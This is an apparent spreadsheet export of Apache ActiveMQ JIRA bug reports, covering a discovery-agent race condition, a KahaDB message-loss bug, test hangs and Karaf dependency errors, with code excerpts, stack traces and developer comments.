The existing AMQ4160Test.java will not pass with these updates since it demonstrates the original bug, which was based on concurrent attempts being allowed to occur.  The original patch was still allowing concurrent attempts.  With these updated changes, concurrent attempts are disallowed so AMQ4160Test.java will fail --- I'll have to provide an updated unit test to account for this behaviour.;;;","08/Nov/12 21:59;tabish;Once you provide the updated patch we'll get this into a SNAPSHOT.;;;","12/Nov/12 19:40;tabish;I fixed up the discovery connector code to properly remove the uri and disabled one of the tests as it was not able to properly test the scenario any longer. ;;;","13/Nov/12 22:38;stirlingc;Reopening this as the activeEvents map was not being cleared when the network connector was stopped; as a result, restarting the network connector would not result in the bridges being re-established.

The updated patch contains the following changes:
- Unit test updated to include verification of handleStop
- Unit test updated to allow inclusion of the previously removed test; now verifies pre and post patch
- Improved waitForBridge/hasBridge methods added to JmsMultipleBrokersTestSupport --- the existing waitForBridgeFormation methods are based on NetworkConnector.bridges, which is updated prior to connections (and thus the bridge) actually being formed --- the new waitForBridge method waits for broker info to be exchange before declaring that a bridge has foremd;;;","13/Nov/12 22:39;stirlingc;Revised patch to address handleStop behaviour.;;;","14/Nov/12 00:46;tabish;Applied the latest updates, lets see how the tests fair with these changes.;;;","29/Nov/12 22:38;tabish;Seems to be working now.;;;","29/Nov/12 23:21;stirlingc;Great to hear, Timothy.  Thanks for working through this with me.;;;","04/Jan/13 14:54;gtully;There was a regression in MulticastDiscoveryOnFaultyNetworkTest - the multicast agent did not reuse events so a remove was being ignored. It now behaves more like the static case w.r.t uniqueness of events.
@Tim or @Sterling - would be great if ye could peek at the changes to be sure I did not miss anything.
http://svn.apache.org/viewvc?rev=1428901&view=rev;;;","08/Jan/13 22:12;tabish;The change seems sensible to me.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Race condition in SimpleDiscoveryAgent creates multiple concurrent threads attempting to connect to the same bridge --- can result in deadlock,AMQ-4159,12614669,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,tabish,stirlingc,stirlingc,03/Nov/12 22:40,02/May/13 02:30,14/Jul/23 05:43,13/Dec/12 23:36,5.8.0,,,,,5.8.0,,,,,,,0,,,,,,,,,"Symptom
=======
I was diagnosing a deadlock issue in {{DiscoveryNetworkConnector}} and noticed that during one of the tests, concurrent calls were being made to {{DiscoveryNetworkConnector.onServiceAdd(...)}} for the same {{DiscoveryEvent}}.  This was unexpected because only a single service (URL) had been given to {{SimpleDiscoveryAgent}}.  In fact, during one of the tests I observed dozens of concurrent calls.

Concurrent attempts to establish a bridge to the *same* remote broker are problematic because they expose a number of race conditions in {{DiscoveryNetworkConnector}} and {{RegionBroker}} that can lead to permanent bridge failure (see AMQ-4160), as well as unnecessary thread pool execution/resource usage and logging.

The issues with {{DiscoveryNetworkConnector}} and {{RegionBroker}} will be filed as separate issues.  This issue specifically addresses the bug that causes {{SimpleDiscoveryAgent}} to uncontrollably multiply bridge connection attempts.

Cause
=====
When {{DemandForwardingBridgeSupport}} handles exceptions from either the local or remote sides of the the bridge, it fires a ""bridge failed"" event:

{code:title=DemandForwardingBridgeSupport.java}
public void serviceLocalException(Throwable error) {
    if (!disposed.get()) {
        LOG.info(""Network connection between "" + localBroker + "" and "" + remoteBroker + "" shutdown due to a local error: "" + error);
        LOG.debug(""The local Exception was:"" + error, error);
        brokerService.getTaskRunnerFactory().execute(new Runnable() {
            public void run() {
                ServiceSupport.dispose(getControllingService());
            }
        });
        fireBridgeFailed();
    }
}


public void serviceRemoteException(Throwable error) {
    if (!disposed.get()) {
        if (error instanceof SecurityException || error instanceof GeneralSecurityException) {
            LOG.error(""Network connection between "" + localBroker + "" and "" + remoteBroker + "" shutdown due to a remote error: "" + error);
        } else {
            LOG.warn(""Network connection between "" + localBroker + "" and "" + remoteBroker + "" shutdown due to a remote error: "" + error);
        }
        LOG.debug(""The remote Exception was: "" + error, error);
        brokerService.getTaskRunnerFactory().execute(new Runnable() {
            public void run() {
                ServiceSupport.dispose(getControllingService());
            }
        });
        fireBridgeFailed();
    }
}

private void fireBridgeFailed() {
    NetworkBridgeListener l = this.networkBridgeListener;
    if (l != null) {
        l.bridgeFailed();
    }
}
{code}

{{DiscoveryNetworkConnector}} is the {{NetworkBridgeListener}}, and its {{bridgeFailed()}} method calls back to {{SimpleDiscoveryAgent.serviceFailed(...)}}:

{code:title=DiscoveryNetworkConnectol.java}
protected NetworkBridge createBridge(Transport localTransport, Transport remoteTransport, final DiscoveryEvent event) {
    class DiscoverNetworkBridgeListener extends MBeanNetworkListener {

        public DiscoverNetworkBridgeListener(BrokerService brokerService, ObjectName connectorName) {
            super(brokerService, connectorName);
        }

        public void bridgeFailed() {
            if (!serviceSupport.isStopped()) {
                try {
                    discoveryAgent.serviceFailed(event);
                } catch (IOException e) {
                }
            }

        }
    }
...
{code}

In response, {{SimpleDiscoveryAgent.serviceFailed(...)}} pauses for the {{reconnectDelay}} before attempting to re-establish the bridge via {{DiscoveryNetworkConnector.onServiceAdd(...)}}:

{code:title=SimpleDiscoveryAgent.java}
public void serviceFailed(DiscoveryEvent devent) throws IOException {

    final SimpleDiscoveryEvent event = (SimpleDiscoveryEvent)devent;
    if (sevent.failed.compareAndSet(false, true)) {

        listener.onServiceRemove(sevent);
        taskRunner.execute(new Runnable() {
            public void run() {
                // We detect a failed connection attempt because the service
                // fails right
                // away.
                if (event.connectTime + minConnectTime > System.currentTimeMillis()) {
                    LOG.debug(""Failure occurred soon after the discovery event was generated.  It will be classified as a connection failure: ""+event);
...
                    synchronized (sleepMutex) {
                        try {
                            if (!running.get()) {
                                LOG.debug(""Reconnecting disabled: stopped"");
                                return;
                            }

                            LOG.debug(""Waiting ""+event.reconnectDelay+"" ms before attempting to reconnect."");
                            sleepMutex.wait(event.reconnectDelay);
                        } catch (InterruptedException ie) {
                            LOG.debug(""Reconnecting disabled: "" + ie);
                            Thread.currentThread().interrupt();
                            return;
                        }
                    }
...
                event.connectTime = System.currentTimeMillis();
                event.failed.set(false);
                listener.onServiceAdd(event);
            }
        }, ""Simple Discovery Agent"");
    }
}
{code}

*NOTE*: the call to {{listener.onServiceAdd(...)}} is made by a new thread!

There are two race conditions that allow {{SimpleDiscoveryAgent.serviceFailed(...)}} to launch more than one thread, each attempting to re-restablish the same bridge.

First, note that {{DemandForwardingBridgeSupport.serviceLocal/RemoteException(...)}} launches a separate thread that stops the bridge:

{code:title=DemandForwardingBridgeSupport.java}
public void serviceRemoteException(Throwable error) {
    if (!disposed.get()) {
        if (error instanceof SecurityException || error instanceof GeneralSecurityException) {
            LOG.error(""Network connection between "" + localBroker + "" and "" + remoteBroker + "" shutdown due to a remote error: "" + error);
        } else {
            LOG.warn(""Network connection between "" + localBroker + "" and "" + remoteBroker + "" shutdown due to a remote error: "" + error);
        } 
        LOG.debug(""The remote Exception was: "" + error, error);
        brokerService.getTaskRunnerFactory().execute(new Runnable() {
            public void run() {
                ServiceSupport.dispose(getControllingService());
            }
        });
        fireBridgeFailed();
    }
}

public void stop() throws Exception {
    if (started.compareAndSet(true, false)) {
        if (disposed.compareAndSet(false, true)) {
            LOG.debug("" stopping "" + configuration.getBrokerName() + "" bridge to "" + remoteBrokerName);
            NetworkBridgeListener l = this.networkBridgeListener;
            if (l != null) {
                l.onStop(this);
            }
{code}

When the bridge stops, the {{disposed}} flag is set, which prevents subsequent calls to {{serviceLocal/RemoteException(...)}} from calling {{fireBridgeFailed()}}.  However, since the call to {{DemandForwardingBridgeSupport.stop()}} is made by a separate thread, multiple {{serviceLocal/RemoteException(...)}} calls that are made in quick succession can result in multiple calls to {{fireBridgeFailed()}}.

This is the first race condition: multiple calls can be made to {{DiscoveryNetworkConnector.bridgeFailed()}} for the same bridge.  By transitivity, this results in multiple calls to {{SimpleDiscoveryAgent.serviceFailed(...)}}.

{{SimpleDiscoveryAgent.serviceFailed(...)}} has a guard class, {{event.failed.compareAndSet(false, true)}}, which should only allow the first call to launch a bridge reconnect thread.  However, once the {{reconnectDelay}} expires, {{event.failed}} is reset to {{false}}, which allows re-entry to the failure handling logic, and the possibile launching of additional bridge reconnect threads if the {{reconnectDelay}} is short or the threads calling {{serviceFailed(...)}} are delayed.

This is the second race condition: the guard clause in {{SimpleDiscoveryAgent.serviceFailed(...)}} can be reset before the subsequent redundant calls have been filtered out.

These two race conditions allow a single call to {{DiscoveryNetworkConnector.onServiceAdd(...)}} to result in multiple subsequent concurrent (re)calls, and these concurrent calls can spawn their own multiple concurrent calls.  The result can be an unlimited number of concurrent calls to {{onServiceAdd(...)}}.

Unit Test
=========
The attached unit test demonstrates this bug by simulating a bridge failure that has yet to be detected by the remote broker (i.e., before the {{InactivityMonitor}} closes the connection).  The local broker attempts to re-establish the bridge, but its call to {{DemandForwardingBridge.startRemoteBroker()}} fails because the remote broker rejects the new connection since the old one still exists.  Since {{startRemoteBroker}} sends multiple messages to the remote broker, multiple exceptions are generated:

{code:title=DemandForwardingBridgeSupport.java}
protected void startRemoteBridge() throws Exception {
...
                remoteBroker.oneway(brokerInfo);
...
            remoteBroker.oneway(remoteConnectionInfo);
...
            remoteBroker.oneway(producerInfo);
...
                remoteBroker.oneway(demandConsumerInfo);
}
{code}

The multiple exceptions result in multiple calls to {{DemandForwardingBridgeSupport.serviceRemoteException(...)}}, which allows the first race condition to be exhibited.  

The first unit test has a 1s {{reconnectDelay}}, which is sufficient to make the second race condition improbable; therefore, this test generally passes. 

The second unit test has a 0s {{reconnectDelay}}; on my system, this makes the timing of multiple calls to {{DemandForwardingBridgeSupport.serviceRemoteException(...)}} such that the second race condition is reliably exhibited, resulting in the unit test failing because it detects concurrent calls to {{DiscoveryNetworkConnector.onServiceAdd(...)}}.

Solution
========
While it would be possible to add a {{failed.compareAndSet(false,true)}} guard clause to {{DemandForwardingBridgeSupport.fireBridgeFailed()}}, and prevent the first race condition from allowing multiple calls to {{SimpleDiscoveryAgent.serviceFailed()}}, the root problem is the race condition in {{serviceFailed}}.  This can be trivially addressed by making a copy of the {{DiscoveryEvent}}, which prevents the original {{event.failed}} guard clause from being reset:

{code:title=Patched SimpleDiscoveryAgent.java}
public void serviceFailed(DiscoveryEvent devent) throws IOException {

    final SimpleDiscoveryEvent sevent = (SimpleDiscoveryEvent)devent;
    if (sevent.failed.compareAndSet(false, true)) {

        listener.onServiceRemove(sevent);
        taskRunner.execute(new Runnable() {
            public void run() {
                SimpleDiscoveryEvent event = new SimpleDiscoveryEvent(sevent);

...
                event.connectTime = System.currentTimeMillis();
                event.failed.set(false);
                listener.onServiceAdd(event);
            }
        }, ""Simple Discovery Agent"");
    }
}
{code} ",,ceposta,gtully,guerrero,lukejackson,stirlingc,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4160,AMQ-3993,,,,,,,,,,,,,,,"03/Nov/12 23:47;stirlingc;AMQ4159.patch;https://issues.apache.org/jira/secure/attachment/12552004/AMQ4159.patch","03/Nov/12 23:45;stirlingc;AMQ4159Test.java;https://issues.apache.org/jira/secure/attachment/12552003/AMQ4159Test.java",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,255090,,,Thu Dec 13 23:36:41 UTC 2012,,,,,,,Patch Available,,,,"0|i0eozr:",83811,,,,,,,,,,,,,,,,,,,,,"03/Nov/12 23:45;stirlingc;Unit test that fails prior to patch, and passes after patch.;;;","05/Nov/12 15:07;tabish;This seems sensible.  Nice catch.;;;","05/Nov/12 15:33;tabish;Patch applied tests all passing locally. ;;;","05/Nov/12 16:45;stirlingc;Thanks for the fast turnaround, Timothy.  I linked AMQ-4159 and AMQ-4160 together as they are related (at least the symptoms were observed during the same test that we were running).  Now that I think about it, the fix for AMQ-4160 relies on AMQ-4159 (i.e., one-to-one relationship between DiscoveryEvent and a bridge creation attempt).  It would be great if AMQ-4160 could also be fixed for AMQ 5.8.0.;;;","07/Nov/12 13:43;gtully;test org.apache.activemq.bugs.AMQ4159Test hangs on trunk from nov 6;;;","08/Nov/12 22:41;stirlingc;I will look into this.  We run a local AMQ build on our build server and experienced the same hanging on AMQ4159Test.  Initial diagnosis indicates a timing issue between stopping the network connector and start it again --- it appears the restart is happening before the connections from the original bridge are fully-closed.;;;","13/Nov/12 23:53;stirlingc;AMQ-4159 stops the network connector and restarts it.  I just patched AMQ-4160 to address an issue where activeEvents was not being cleared on DiscoveryNetworkConnector.handleStop --- as a result, the restart would be ignored.  This could have caused the hanging test, although I believe it occurred prior to the change for AMQ-4160 that would have caused the restart to be ignored.

I've periodically seen bridge formation stop when the network connector is stopped and restarted in quick succession.  I'm continuing to investigate.;;;","13/Dec/12 23:36;tabish;The issue described here seems to have been fully resolved.  The test isn't really showing much so I removed it from the build.  If you run into more problems along this line I'd recommend trying to get a test working and reopen or create a new issue;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
BTreeIndexTest hangs when run on Windows,AMQ-4158,12614565,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,kearls,kearls,02/Nov/12 19:34,30/Nov/12 22:03,14/Jul/23 05:43,30/Nov/12 22:03,5.7.0,,,,,5.8.0,,,Test Cases,,,,0,,,,,,,,,"BTreeIndexTest hangs when run on windows because it repeatedly tries to create/delete the same directory, which is problematic on windows.  I've attached a patch which just adds a timestamp to the directory name.
",Windows 2008 Server,kearls,tabish,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"07/Nov/12 22:12;kearls;Fix_Windows_BTreeIndexTest_hang1.patch;https://issues.apache.org/jira/secure/attachment/12552550/Fix_Windows_BTreeIndexTest_hang1.patch","02/Nov/12 19:35;kearls;IndexTestSupportTempDir_.patch;https://issues.apache.org/jira/secure/attachment/12551917/IndexTestSupportTempDir_.patch",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,254053,,,Fri Nov 30 22:03:19 UTC 2012,,,,,,,Patch Available,,,,"0|i0eian:",82726,Unit Test Broken,,,,,,,,,,,,,,,,,,,,"02/Nov/12 19:53;tabish;Patch applied, thanks.;;;","07/Nov/12 22:12;kearls;Unfortunately my first fix did not work.  I will attach another patch which should.  It converts several tests to JUnit4, add's timeouts in the @Test annotation, and moves the code that I think was causing the hang out of setup()
;;;","07/Nov/12 22:12;kearls;Converted tests to JUnit 4 and added timeouts to prevent windows hangs
;;;","07/Nov/12 22:56;tabish;Unfortunately the patch is not able to be applied cleanly with the recent refactorings in trunk.;;;","30/Nov/12 22:03;tabish;Reworked the patch so it would apply to the new layout, changes added in trunk. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
KahaDBTransactionStore.removeAyncMessage may cancel addMessage when in transaction leading to unpersisted messages,AMQ-4157,12614557,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Blocker,Fixed,gtully,mserrano,mserrano,02/Nov/12 19:07,28/Aug/13 14:29,14/Jul/23 05:43,28/Aug/13 14:29,5.7.0,,,,,5.9.0,,,Message Store,,,,0,,,,,,,,,"This was very difficult to track down.  It rarely occurs because a certain set of events must be occurring to trigger the bug.   I have marked it a Blocker because when it does occur, it is silent and leads to a message not being persisted in the MessageStore.

*Description*
The crux of the bug is that when a rollback on a session occurs, the resulting MessageAck can overlap with the async store of the message in the KahaDB.   When this occurs, the message is never persisted.  Additionally, the resultant {{CancellationException}} is ignored in o.a.a.broker.region.Queue:796.   The steps:

# a StoreQueueTask is created to add a message X.  this is put on the async task queue
# meanwhile this message is dispatched via a prefetch subscription to a transacted consumer.
# the transacted consumer calls session.rollback
# this leads to acknowledgement of the dispatched message
# as a result {{destination.removeAsyncMessage()}} is called
# if the original add has not yet executed then it will be cancelled leading to the message never being persisted!  (occurs at KahaDBStore:401)
# the Queue.send method uses the result future to make sure the persist happens in the store, but it ignores cancellation, so this can lead execution control to return to the sender when no persistence has occurred without an error.

I have not been able to reproduce this in a small activemq-only test.  But I can reproduce it in my environment.  

*Proposed Solutions*
I'm really unsure of the solution here.  Should {{KahaDBStore.removeAsyncMessage}} (line 393) check the context and only cancel tasks if it is not in a transaction context?  But what would that mean in the log?  Would there be a removeMessage prior to the addMessage?

*Workaround*
* turn off caching for the destination (see [dest policies|http://activemq.apache.org/per-destination-policies.html]).  this will cause messages to be added synchronously so they will not be subject to the async cancellation","linux 64-bit, kahadb, persisted messages, cached dest, transacted",donnchadh,gtully,kearls,mserrano,tabish,willjohnson3,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"06/Feb/13 22:20;kearls;org.apache.activemq.bugs.AMQ4157Test-output.txt;https://issues.apache.org/jira/secure/attachment/12568311/org.apache.activemq.bugs.AMQ4157Test-output.txt",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,254045,,,Wed Aug 28 14:29:40 UTC 2013,,,,,,,,,,,"0|i0ei8v:",82718,,,,,,,,,,,,,,,,,,,,,"02/Nov/12 19:24;mserrano;Note in my integration test which does reproduce this, it failed 5 times out of 231 runs.;;;","03/Nov/12 01:27;mserrano;I confirmed the workaround.  When turning off caching, the test no longer failed (500 iterations succeed);;;","07/Nov/12 15:52;gtully;getting this on the radar for 5.8;;;","10/Jan/13 14:35;gtully;There is another workaround, {code}<kahaDB concurrentStoreAndDispatchQueues=""false"" ..>{code};;;","10/Jan/13 16:15;gtully;fix in http://svn.apache.org/viewvc?rev=1431463&view=rev

@Martin, thanks for the great description and diagnosis, it very much helped the process of building a reproducible junit test case to validate and protect the fix.;;;","06/Feb/13 22:20;kearls;This test is still failing for me, usually with a message like the one below. This test failed on message 992, but typically it fails on 998 or 999.

I will attach the log.

Running org.apache.activemq.bugs.AMQ4157Test
Tests run: 1, Failures: 1, Errors: 0, Skipped: 0, Time elapsed: 32.811 sec <<< FAILURE!
testPublishCountsWithRollbackConsumer(org.apache.activemq.bugs.AMQ4157Test)  Time elapsed: 32.538 sec  <<< FAILURE!
java.lang.AssertionError: got message 992
	at org.junit.Assert.fail(Assert.java:88)
	at org.junit.Assert.assertTrue(Assert.java:41)
	at org.junit.Assert.assertNotNull(Assert.java:621)
	at org.apache.activemq.bugs.AMQ4157Test.consumeMessages(AMQ4157Test.java:123)
	at org.apache.activemq.bugs.AMQ4157Test.testPublishCountsWithRollbackConsumer(AMQ4157Test.java:101)


Results :

Failed tests: 
  AMQ4157Test.testPublishCountsWithRollbackConsumer:101->consumeMessages:123 got message 992
;;;","06/Feb/13 22:38;tabish;Reopened since Kevin is seeing failures.  I saw it fail last night also. ;;;","28/Aug/13 14:29;gtully;seems to be resolved on trunk;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Inactivity monitor rejected from thread pool,AMQ-4156,12614543,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,seminolas,seminolas,02/Nov/12 18:05,05/Nov/12 10:59,14/Jul/23 05:43,02/Nov/12 19:40,5.5.1,,,,,5.8.0,,,,,,,0,concurrency,,,,,,,,"2012/09/04 17:50:10.746 [UncaughtExceptionHandler] [InactivityMonitor WriteCheck]:   ERROR:  FATAL ERROR Uncaught Exception occurred in thread Thread[InactivityMonitor WriteCheck,5,main]  
[Exception: java.util.concurrent.RejectedExecutionException: Task org.apache.activemq.transport.InactivityMonitor$3@321e23e9 rejected from java.util.concurrent.ThreadPoolExecutor@58c7afb3[Terminated, pool size = 0, active threads = 0, queued tasks = 0, completed tasks = 441]
	at java.util.concurrent.ThreadPoolExecutor$AbortPolicy.rejectedExecution(ThreadPoolExecutor.java:2013)
	at java.util.concurrent.ThreadPoolExecutor.reject(ThreadPoolExecutor.java:816)
	at java.util.concurrent.ThreadPoolExecutor.execute(ThreadPoolExecutor.java:1337)
	at org.apache.activemq.transport.InactivityMonitor.writeCheck(InactivityMonitor.java:147)
	at org.apache.activemq.transport.InactivityMonitor$2.run(InactivityMonitor.java:113)
	at org.apache.activemq.thread.SchedulerTimerTask.run(SchedulerTimerTask.java:33)
	at java.util.TimerThread.mainLoop(Timer.java:555)
	at java.util.TimerThread.run(Timer.java:505)
] 


N.B. The system was not shutting down as far as I can see. It was on a VM, and the logs show a long idle gap before this excerpt. Which may mean the VM was paused, although gaps may occur in normal operation as well. I only have one log as evidence, although people have seen it a few more times apparently.","VM name: Java HotSpot(TM) 64-Bit Server VM
VM Version: 23.1-b03
VM Vendor: Oracle Corporation",seminolas,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,254029,,,Fri Nov 02 19:40:51 UTC 2012,,,,,,,,,,,"0|i0ei4v:",82700,,,,,,,,,,,,,,,,,,,,,"02/Nov/12 18:26;tabish;It looks like there is a tiny window in which its possible that a write check task could be fired after the static ExecutorService has been shutdown because all connections closed and the class attempts to close down that service until its needed again.  I don't think it will have any serious side effects as far as I can see. ;;;","02/Nov/12 19:40;tabish;Added some additional checks in the AbstractInactivityMonitor to prevent it from throwing an error if the timer task fails to queue into the executor because its shutdown. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Karaf activemq feature can't be installed due to the unresolved dependencies,AMQ-4154,12614487,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,davsclaus,kapyar,kapyar,02/Nov/12 09:37,23/Nov/12 21:15,14/Jul/23 05:43,02/Nov/12 10:19,5.8.0,,,,,5.8.0,,,Message Store,,,,0,,,,,,,,,"Trying to install ActiveMQ 5.8-SNAPSHOT feature compiled from latest trunk to Apache Karaf and got next error:
{code} 
java.lang.Exception: Can not resolve feature:
Unsatisfied requirement(s):
---------------------------
   package:(&(package=org.codehaus.jackson.map)(version>=1.9.0)(!(version>=2.0.0)))
      activemq-console
   package:(&(package=org.fusesource.hawtbuf)(version>=1.9.0)(!(version>=2.0.0)))
      activemq-console
   package:(&(package=org.fusesource.hawtbuf.proto)(version>=1.9.0)(!(version>=2.0.0)))
      activemq-console
{code}
Seems like unresolved dependencies were added in revision 1402652 (AMQ-4137 fix).",,davsclaus,kapyar,ytsejammer,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,253962,,,Fri Nov 23 21:15:43 UTC 2012,,,,,,,,,,,"0|i0edov:",81980,,,,,,,,,,,,,,,,,,,,,"02/Nov/12 09:46;davsclaus;What feature do you install. Can you share that with us.;;;","02/Nov/12 10:03;kapyar;For example, using fresh Apache Karaf 2.3.0 installation:
{code}
[avm@3cky apache-karaf-2.3.0]$ ./bin/karaf start
        __ __                  ____      
       / //_/____ __________ _/ __/      
      / ,<  / __ `/ ___/ __ `/ /_        
     / /| |/ /_/ / /  / /_/ / __/        
    /_/ |_|\__,_/_/   \__,_/_/         

  Apache Karaf (2.3.0)

Hit '<tab>' for a list of available commands
and '[cmd] --help' for help on a specific command.
Hit '<ctrl-d>' or 'osgi:shutdown' to shutdown Karaf.

karaf@root> features:addurl mvn:org.apache.activemq/activemq-karaf/5.8-SNAPSHOT/xml/features
karaf@root> features:install activemq
Error executing command: Could not start bundle mvn:org.apache.activemq/activemq-console/5.8-SNAPSHOT in feature(s) activemq-5.8-SNAPSHOT: Unresolved constraint in bundle org.apache.activemq.activemq-console [74]: Unable to resolve 74.0: missing requirement [74.0] osgi.wiring.package; (&(osgi.wiring.package=org.codehaus.jackson.map)(version>=1.9.0)(!(version>=2.0.0)))
{code};;;","02/Nov/12 10:03;davsclaus;Okay its the activemq-console bundle that has a new import/export command.;;;","02/Nov/12 10:19;davsclaus;I committed a fix. Feel free to trunk with latest code from trunk.;;;","23/Nov/12 21:15;ytsejammer;This is my experience with a fresh install of Karaf 2.3.0. I am not sure if there were other dependencies still left unresolved.

Please notice that after the first error was reported, I manually installed *commons-daemon/commons-daemon/1.0.10* but it was not sufficient to make it work, since now it reports some imported package (*org.apache.hadoop.conf*) not available.

{noformat}
        __ __                  ____      
       / //_/____ __________ _/ __/      
      / ,<  / __ `/ ___/ __ `/ /_        
     / /| |/ /_/ / /  / /_/ / __/        
    /_/ |_|\__,_/_/   \__,_/_/         

  Apache Karaf (2.3.0)

Hit '<tab>' for a list of available commands
and '[cmd] --help' for help on a specific command.
Hit '<ctrl-d>' or 'osgi:shutdown' to shutdown Karaf.

karaf@root> features:addurl mvn:org.apache.activemq/activemq-karaf/5.8-SNAPSHOT/xml/features
karaf@root> features:install activemq
Error executing command: Could not start bundle mvn:org.apache.activemq/activemq-core/5.8-SNAPSHOT in feature(s) activemq-5.8-SNAPSHOT: Unresolved constraint in bundle org.apache.activemq.activemq-core [75]: Unable to resolve 75.0: missing requirement [75.0] osgi.wiring.package; (&(osgi.wiring.package=org.apache.commons.daemon)(version>=1.0.0)(!(version>=2.0.0)))
karaf@root> osgi:install mvn:commons-daemon/commons-daemon/1.0.10
Bundle ID: 81
karaf@root> features:install activemq
Error executing command: Could not start bundle mvn:org.apache.activemq/activemq-core/5.8-SNAPSHOT in feature(s) activemq-5.8-SNAPSHOT: Unresolved constraint in bundle org.apache.activemq.activemq-core [103]: Unable to resolve 103.0: missing requirement [103.0] osgi.wiring.package; (osgi.wiring.package=org.apache.hadoop.conf)
karaf@root>
{noformat};;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveMQWASInitialContextFactory issue in transform logic,AMQ-4153,12614480,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,davsclaus,davsclaus,davsclaus,02/Nov/12 07:54,02/Nov/12 08:57,14/Jul/23 05:43,02/Nov/12 08:57,5.7.0,,,,,5.8.0,,,,,,,0,,,,,,,,,"See nabble
http://activemq.2283324.n4.nabble.com/Help-configuring-ActiveMQ-as-JMSProvider-in-WebSphere-tp4658603.html

The code in ActiveMQWASInitialContextFactory is flawed.
If the WAS has:
java.naming.queue=jms/systemMessageQueue

Then the logic assumes there is a .xxx in the key, eg
java.naming.queue.foo=jms/systemMessageQueue

But it may not be and then you get a StringIndexOutOfBoundsException",,davsclaus,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,253951,,,2012-11-02 07:54:12.0,,,,,,,,,,,"0|i0ecbj:",81758,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
